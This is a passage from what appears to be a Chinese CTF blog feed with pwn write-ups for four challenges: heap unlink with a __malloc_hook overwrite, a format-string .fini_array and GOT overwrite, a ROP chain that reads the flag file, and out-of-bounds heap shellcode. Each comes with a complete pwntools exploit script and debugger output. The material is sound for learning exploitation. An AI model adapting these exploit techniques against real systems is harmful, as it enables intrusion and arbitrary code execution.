<p>第二步，开始构造fake chunk0，通过unlink来修改buf数组指向bss段，而我们将shellcode写入bss段，在通过修改__malloc_hook的地址为shellcode的地址，这里得到bss = 0x601020，buf = 0x601040。可以构造payload=p64(0)+p64(0x91)+p64(buf-0x18)+p64(buf-0x10)+p64(0)*14+p64(0x90)+p64(0xa0),</p>
<p>此时堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000000091
gdb-peda$ 
0x1ea8020:	0x0000000000601028	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>可以看到已经伪造了一个假的堆，然后我们释放chunk1，chunk1会向前合并fake chunk0然后并入top chunk中</p>
<p>堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000020ff1
gdb-peda$ 
0x1ea8020:	0x0000000000601028	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>可以看到已经并入top chunk中了，然后在看一下buf数组的情况：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601028	0x0000000001ea80b0
0x601050:	0x0000000000000000	0x0000000000000000

</code></pre>
<p>可以看到buf[0]指向的地址已经变为0x0000000000601028，这时我们修改chunk0实际是修改的bss段的数据</p>
<p>可以修改让buf[0]指向bss段的首地址，同时，也伪造了一个fake chunk1，让buf[1]指向buf数组的首地址：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601020	0x0000000000601040
0x601050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601060:	0x0000000000000000	0x0000000000000020
0x601070:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>下一步就是如何让buf数组中的一个指向__malloc_hook，这里再申请两个堆，这里的chunk2就是我们伪造fake chunk0，堆的情况：</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000000	0x0000000000000111
gdb-peda$ 
0x1ea8020:	0x0000000000600a63	0x0000000000601030
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000090	0x00000000000000a0
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000111
0x1ea8130:	0x0000000000000a64	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1
</code></pre>
<p>这里先删除chunk2，chunk2就会进入unsorted bin：</p>
<pre><code>db-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x1ea8010 —▸ 0x7f7df0843b78 (main_arena+88) ◂— adc    byte ptr [rax + 0x1ea], al /* 0x1ea8010 */
smallbins
empty
largebins
empty
</code></pre>
<p>然后修改chunk2，让fake chunk1也进入unsorted bin</p>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x1ea8010 ◂— 0x0
BK: 0x1ea8010 —▸ 0x601060 ◂— 0
smallbins
empty
largebins
empty

</code></pre>
<p>这里在申请一个和chunk2相同大小的chunk4，然后留在unsortedbin就只有fake chunk1，</p>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x1ea8010 ◂— 0xa65 /* 'e\n' */
BK: 0x601060 ◂— 0
smallbins
empty
largebins
empty
</code></pre>
<p>这时buf数组的情况：</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000000
0x601030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601040:	0x0000000000601020	0x0000000000601040
0x601050:	0x0000000001ea8020	0x0000000001ea8130
gdb-peda$ 
0x601060:	0x0000000001ea8020	0x0000000000000020
0x601070:	0x00007f7df0843b78	0x0000000000000000
</code></pre>
<p>可以看到buf[6]已经为main_arena+88的地址了，这里我们可以通过修改chunk1来修改0x601040~0x601070的数据，这样我们就可以让buf[6]指向的地址变为__malloc_hook的地址。然后在修改__malloc_hook的地址处的数据的为shellcode的地址，这样在malloc的时候会触发shellcode。然后同修改chunk0在bss段来布置shellcode。</p>
<pre><code>gdb-peda$ x/4gx 0x601020
0x601020:	0x6e69622fb848686a	0xe7894850732f2f2f
0x601030:	0x2434810101697268	0x6a56f63101010101
gdb-peda$ 
0x601040:	0x894856e601485e08	0x050f583b6ad231e6
0x601050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x601060:	0x0000000000000000	0x0000000000000000
0x601070:	0x00007f7df0843b10	0x0000000000000000
gdb-peda$ 
0x601080:	0x0000000000000000	0x0000000000000000
0x601090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x6010a0:	0x0000000000000000	0x0000000000000000
0x6010b0:	0x0000000000000000	0x0000000000000000

</code></pre>
<pre><code>0x7f7df0843b10 &lt;__malloc_hook&gt;:	0x0000000000601020	0x0000000000000000
0x7f7df0843b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000
</code></pre>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *

def add(size, content):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('1')
	print r.recvuntil(&quot;Size: &quot;)
	r.sendline(size)
	print r.recvuntil(&quot;Data: &quot;)
	r.send(content)

def delete(index):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('2')
	print r.recvuntil(&quot;Index: &quot;)
	r.sendline(index)

def edit(index, size, content):
	print r.recvuntil(&quot;Your choice :&quot;)
	r.sendline('3')
	print r.recvuntil(&quot;Index: &quot;)
	r.sendline(index)
	print r.recvuntil(&quot;Size: &quot;)
	r.sendline(size)
	print r.recvuntil(&quot;Data: &quot;)
	r.send(content)


#r = remote(&quot;220.249.52.133&quot;, 58646)
r=process(&quot;./timu&quot;)
context(arch = &quot;amd64&quot;, os = 'linux')
elf = ELF(&quot;./timu&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)
malloc_hook = libc.symbols['__malloc_hook']
bss = 0x601020
buf = 0x601040
gdb.attach(r)

#	chunk 0 
add(str(0x90), 'a\n')
#	chunk 1
add(str(0x90), 'b\n')
#	fade chunk0
#	      pre_size,    size
payload = p64(0) + p64(0x91) 
#	      fd,                   bk  
payload += p64(buf - 0x18) + p64(buf - 0x10)  
payload += p64(0) * 14
#	change chunk size of 1
payload += p64(0x90) + p64(0xa0)  

edit('0', str(len(payload)), payload)
delete('1')
payload = p64(0) * 3 + p64(bss) + p64(buf) + p64(0) * 3 + p64(0x20)
#	change buf[0] pointer to bss, buf[1] to buf
edit('0', str(len(payload)), payload) 

#	chunk 2
add(str(0x100), 'c\n')
#	chunk 3
add(str(0x100), 'd\n')

delete('2')
payload = p64(0) + p64(buf + 0x8 * 4)
edit('2', str(len(payload)), payload)

#	chunk 4, addr is the same with chunk2
add(str(0x100), 'e\n')

payload = p64(bss) + p64(buf) + p64(0) * 4 + '\x10'
edit('1', str(len(payload)), payload)

shellcode = asm(shellcraft.sh())
edit('0', str(len(shellcode)), shellcode)
#	change malloc hook
edit('6', '8', p64(bss))

print r.recvuntil(&quot;Your choice :&quot;)
r.sendline('1')
print r.recvuntil(&quot;Size: &quot;)
r.sendline('1')

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用格式化字符串漏洞覆盖.fini_array函数]]></title>
        <id>https://czh11.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-fu-gai-fini_array-han-shu/</id>
        <link href="https://czh11.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-fu-gai-fini_array-han-shu/">
        </link>
        <updated>2020-12-01T04:35:46.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界- greeting-150</p>
<p>检查一下保护</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec greeting-150
[*] '/home/giantbranch/Desktop/greeting-150'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>看一下函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-84h]
  char v5; // [esp+5Ch] [ebp-44h]
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf(&quot;Please tell me your name... &quot;);
  if ( !getnline(&amp;v5, 64) )
    return puts(&quot;Don't ignore me ;( &quot;);
  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);
  return printf(&amp;s);
}
</code></pre>
<pre><code>size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [esp+1Ch] [ebp-Ch]

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}
</code></pre>
<p>发现有个格式化字符串漏洞，但是没有循环，</p>
<pre><code>关于.init_array 和.fini_array，也就是构造函数与析构函数

大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 .init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写.fini_array 函数指针。对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。
</code></pre>
<p>因此这题可以利用格式化字符串漏洞覆盖.fini_array函数，重新执行main函数，同时可以利用格式化字符串漏洞覆盖strlen函数的got表，让其执行system函数。</p>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *
#r=process(&quot;./greeting-150&quot;)
r=remote(&quot;220.249.52.133&quot;,39180)
context.log_level='debug'
r.recvuntil(&quot;Please tell me your name... &quot;)
fini_got=0x08049934
main=0x080485ED
system=0x08048490
strelen=0x8049A54
payload='aa'+p32(strelen+2)+p32(strelen)+p32(fini_got)+'%'+str(0x804-32)+'c%12$hn'
payload+='%'+str(0x8490-0x804)+'c%13$hn'
payload+='%'+str(0x85ED-0x8490)+'c%14$hn'
r.sendline(payload)
r.recvuntil(&quot;Please tell me your name... &quot;)
r.sendline('/bin/sh')
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[pwntools中判断输入是否结束]]></title>
        <id>https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/</id>
        <link href="https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/">
        </link>
        <updated>2020-11-28T06:36:16.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界-Recho</p>
<p>这题很容易发现是栈溢出，但是如何从while循环中退出来，困扰了很长时间，看来wp才发现pwntools中有一个io.shutdown('send')，帮助输入结束，然后就查看了一下字符串，发现有个flag，接下来就是如何从中读取出flag了，这里用open打开，用read读出，用printf打印出来，open的系统调用号是2，而且alarm是系统调用的函数，通过gdb调试找到syscall的偏移，然后就是构造payload了。</p>
<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1606545634031.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1606545642873.jpg" alt="" loading="lazy"></figure>
<pre><code>#!/usr/bin/env python2
#-*-coding:utf-8 -*
from pwn import *
context.log_level='debug'
r=process(&quot;./Recho&quot;)
r=remote(&quot;220.249.52.133&quot;,38037)
elf=ELF(&quot;./Recho&quot;)
write_plt=elf.plt['write']
read_plt=elf.plt['read']
alarm_plt=elf.plt['alarm']
alarm_got=elf.got['alarm']
printf_plt=elf.plt['printf']
pop_rdi=0x00000000004008a3
pop_rsi=0x00000000004008a1
pop_rdx=0x00000000004006fe
pop_rax=0x00000000004006fc
add_rdi_al=0x000000000040070d
flag=0x0601058
bss=0x0601090
payload='a'*0x38
payload+=p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(0x5)+p64(add_rdi_al)
payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(0x2)+p64(alarm_plt)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x500)+p64(0)+p64(pop_rdx)+p64(0x50)+p64(read_plt)
payload+=p64(pop_rdi)+p64(bss+0x500)+p64(printf_plt)
r.recvuntil(&quot;Welcome to Recho server!&quot;)
r.sendline(str(0x200))
payload=payload.ljust(0x200,'\x00')
r.sendline(payload)
r.recv()
r.shutdown('send')
r.interactive()
r.close
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ctfpwn 一道数组越界的堆题]]></title>
        <id>https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/</id>
        <link href="https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/">
        </link>
        <updated>2020-11-19T13:44:23.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p><img src="https://czh11.github.io/post-images/1605793554457.png" alt="" loading="lazy"><br>
没有限制v1的范围，导致数组的下标可以为任意值，造成数组越界。<br>
<img src="https://czh11.github.io/post-images/1605793729793.jpg" alt="" loading="lazy"><br>
没有开启NX，堆栈可执行，所以可以把shellcode写在堆上，堆申请的大小最大为8，所以要把shellcode写在多个堆块上，</p>
<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1605793839389.jpg" alt="" loading="lazy"></figure>
<p>同时写进去的最后一个字节会被置0，因此正真能写的只有7个字节。</p>
<p>综上，我们可以申请任意地址的8个字节改为我们申请的堆块的指针，这里修改got表的内容让它跳转到我们shellcode的地址。</p>
<p>Jmp short xxxx指令占用2字节，这条指令使用的是相对当前指令的下一条指令位置寻址的 。</p>
<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1605793857686.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://czh11.github.io/post-images/1605793900510.jpg" alt="" loading="lazy"></figure>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
p=process(&quot;./note-service2&quot;)
#p=remote(&quot;220.249.52.133&quot;,42490)
elf=ELF(&quot;./note-service2&quot;)
print(hex(elf.got['free']))
context.log_level='debug'
context.arch='amd64'
def add(index,content):
    p.recvuntil('your choice&gt;&gt;')
    p.sendline('1')
    p.recvuntil('index')
    p.sendline(str(index))
    p.recvuntil('size')
    p.sendline(str(8))    
    p.recvuntil('content')
    p.send(content)

def delete(index):
	p.recvuntil('your choice&gt;&gt;')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(index))

&quot;&quot;&quot;
;64位系统调用
mov rdi,xxxx;&quot;/bin/sh&quot;的地址
mov rax,0x3b;execve系统调用号
mov rsi,0
mov rdx,0
sycall
&quot;&quot;&quot;
gdb.attach(p)
add(0,'/bin/sh')# 向第一个chunk中写入/bin/sh
add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
#把got表中free函数的指针覆盖为第二个chunk的指针
#然后在第二个chunk中写入
#xor rsi,rsi
#nop
#nop
#jmp 0x19
add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
#mov rax,0x3b的机器码站7个字节,而push 0x3b;pop rax只占3个字节
#push 0x3b
#pop rax
#nop
#nop
#jmp 0x19
add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
#
add(3,asm('syscall')+'\x90'*5)

delete(0)
#因为got表的free函数的地址被修改为我们第二个chunk的地址了,
#所以我们调用free的时候就跳转到了我们第二个chunk的数据段,
#因为这是一个64位程序的函数调用，所以程序会把我们第一个chunk的数据区的指针放入RDI;
#在64位的程序中,当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。

p.interactive()
</code></pre>
]]></content>
    </entry>
</feed>